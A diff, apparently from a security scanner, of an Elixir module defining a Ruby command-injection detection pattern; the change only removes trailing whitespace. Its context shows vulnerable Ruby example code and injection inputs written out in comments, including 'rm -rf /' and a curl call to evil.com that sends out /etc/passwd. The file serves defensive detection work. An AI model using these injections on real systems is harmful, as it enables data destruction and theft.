@@ -24,11 +24,11 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
   class FileController < ApplicationController
     def download
       filename = params[:file]  # User input: "file.txt; rm -rf /"
-      
+
       # VULNERABLE: Direct interpolation into system command
       system("cat \#{filename}")
       # Results in: cat file.txt; rm -rf /
-      
+
       # VULNERABLE: Backtick execution
       content = `head -10 \#{filename}`
       # Attack: filename = "file.txt; curl evil.com/steal?data=$(cat /etc/passwd)"
@@ -305,7 +305,7 @@ defmodule Rsolv.Security.Patterns.Ruby.CommandInjection do
       iex> enhancement = Rsolv.Security.Patterns.Ruby.CommandInjection.ast_enhancement()
       iex> Map.keys(enhancement) |> Enum.sort()
       [:ast_rules, :confidence_rules, :context_rules, :min_confidence]
-      
+
       iex> enhancement = Rsolv.Security.Patterns.Ruby.CommandInjection.ast_enhancement()
       iex> enhancement.min_confidence
       0.7
